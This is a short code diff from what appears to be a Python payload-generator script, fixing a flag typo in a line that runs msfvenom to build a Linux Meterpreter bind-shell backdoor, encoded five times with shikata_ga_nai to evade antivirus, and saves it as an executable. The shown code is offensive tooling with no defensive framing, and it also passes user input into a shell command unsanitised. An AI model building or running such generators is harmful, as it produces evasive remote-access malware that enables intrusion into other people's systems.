@@ -82,7 +82,7 @@ def linux(namder):
         name = str(input('name_file: '))
 
         subprocess.check_output(
-            f'msfvenom - p linux/x86/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 - f elf > {directory}{name}', shell=True)
+            f'msfvenom -p linux/x86/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 - f elf > {directory}{name}', shell=True)
 
 
 def android(namder):
